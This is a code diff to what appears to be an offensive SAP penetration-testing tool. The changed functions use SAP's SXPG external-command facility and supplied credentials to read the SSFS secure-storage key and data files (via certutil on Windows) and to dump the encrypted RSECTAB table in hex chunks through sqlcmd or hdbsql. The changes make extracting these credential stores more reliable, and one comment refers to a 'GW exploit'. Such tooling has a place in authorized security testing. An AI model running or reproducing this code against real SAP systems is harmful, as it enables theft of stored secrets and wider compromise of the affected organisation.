@@ -456,23 +456,23 @@ def _read_ssfs_files_via_sxpg(node, creds) -> tuple:
     sid = node.sid
     is_windows = (node.os_type or "").lower() in ("windows", "win", "nt")
 
-    # Determine instance string for temp file path on Windows
-    inst_str = "D00"
-    for inst in node.instances:
-        if inst.instance_nr and inst.instance_nr != "XX":
-            nr = inst.instance_nr
-            inst_str = f"DVEBMGS{nr}" if int(nr) < 50 else f"D{nr}"
-            break
-
-    # SSFS file paths to try (both /usr/sap/ and /sapmnt/)
+    # SSFS file paths to try
     if is_windows:
+        # Use SAP environment variables — they always point to the correct paths
+        # regardless of drive letter (C:, P:, ...) or UNC share (\\host\sapmnt\...).
+        # The variables RSEC_SSFS_KEYPATH / RSEC_SSFS_DATAPATH are set by SAP
+        # at process startup.  cmd.exe expands them when certutil is invoked.
         key_paths = [
+            f"%RSEC_SSFS_KEYPATH%\\SSFS_{sid}.KEY",
+            # Fallback: classic C:\usr\sap layout (older SAP installations)
             f"C:\\usr\\sap\\{sid}\\SYS\\global\\security\\rsecssfs\\key\\SSFS_{sid}.KEY",
         ]
         dat_paths = [
+            f"%RSEC_SSFS_DATAPATH%\\SSFS_{sid}.DAT",
             f"C:\\usr\\sap\\{sid}\\SYS\\global\\security\\rsecssfs\\data\\SSFS_{sid}.DAT",
         ]
-        work_dir = f"C:\\usr\\sap\\{sid}\\{inst_str}\\work"
+        # %TEMP% is expanded by cmd.exe — works for any drive/path layout
+        work_dir = "%TEMP%"
     else:
         key_paths = [
             f"/usr/sap/{sid}/SYS/global/security/rsecssfs/key/SSFS_{sid}.KEY",
@@ -581,8 +581,12 @@ def _read_rsectab_via_sxpg(node, creds) -> list | None:
             node, "hdbsql", f"-U DEFAULT -x {sql}", creds)
 
     def _mss_query(sql):
+        # Use named-instance dot-notation (.\\<SID>_DB) — same pattern as the GW
+        # exploit.  TCP/1433 is typically disabled on SAP MSSQL named-instance
+        # systems; shared-memory / named-pipes on .\\<SID>_DB always work locally.
+        mssql_server = f".\\{sid.upper()}_DB"
         return sapmap_rfc.execute_local_command(
-            node, "sqlcmd", f"-S localhost -h -1 -W -Q {sql}", creds)
+            node, "sqlcmd", f"-S {mssql_server} -h -1 -W -Q {sql}", creds)
 
     def _ada_query(sql):
         return sapmap_rfc.execute_local_command(
@@ -607,7 +611,9 @@ def _read_rsectab_via_sxpg(node, creds) -> list | None:
         sub_fn = "SUBSTR"
     elif db_key == "MSS":
         run_q = _mss_query
-        tbl = f"[{sid}].[{sid}].[RSECTAB]"
+        # 3-part name: [database].[schema].[table]
+        # Schema is lowercase (dbs/mss/schema = sid.lower()) — case-sensitive collation
+        tbl = f"[{sid.upper()}].[{sid.lower()}].[RSECTAB]"
         hex_fn = "CONVERT(VARCHAR(400),DATA,2)"
         sub_fn = "SUBSTRING"
     elif db_key in ("ORA", "ORACLE"):
@@ -631,11 +637,16 @@ def _read_rsectab_via_sxpg(node, creds) -> list | None:
         return None
 
     sql_ident = f"SELECT IDENT FROM {tbl}"
+    # All chunks include an explicit length — SQL Server SUBSTRING() requires 3 args;
+    # using chunk (120) for the last segment is safe: it returns whatever is left
+    # (≤120 chars) without truncating, because SUBSTRING/SUBSTR silently stops
+    # at the end of the string.  The total RSECTAB DATA hex is 368 chars
+    # (184 bytes × 2), split into 120+120+120+8.
     sql_chunks = [
         f"SELECT {sub_fn}({hex_fn},1,{chunk}) FROM {tbl}",
         f"SELECT {sub_fn}({hex_fn},{chunk+1},{chunk}) FROM {tbl}",
         f"SELECT {sub_fn}({hex_fn},{chunk*2+1},{chunk}) FROM {tbl}",
-        f"SELECT {sub_fn}({hex_fn},{chunk*3+1}) FROM {tbl}",
+        f"SELECT {sub_fn}({hex_fn},{chunk*3+1},{chunk}) FROM {tbl}",
     ]
 
     print(f"[*] {node.sid}: Reading RSECTAB via SXPG ({db_key} CLI)...")
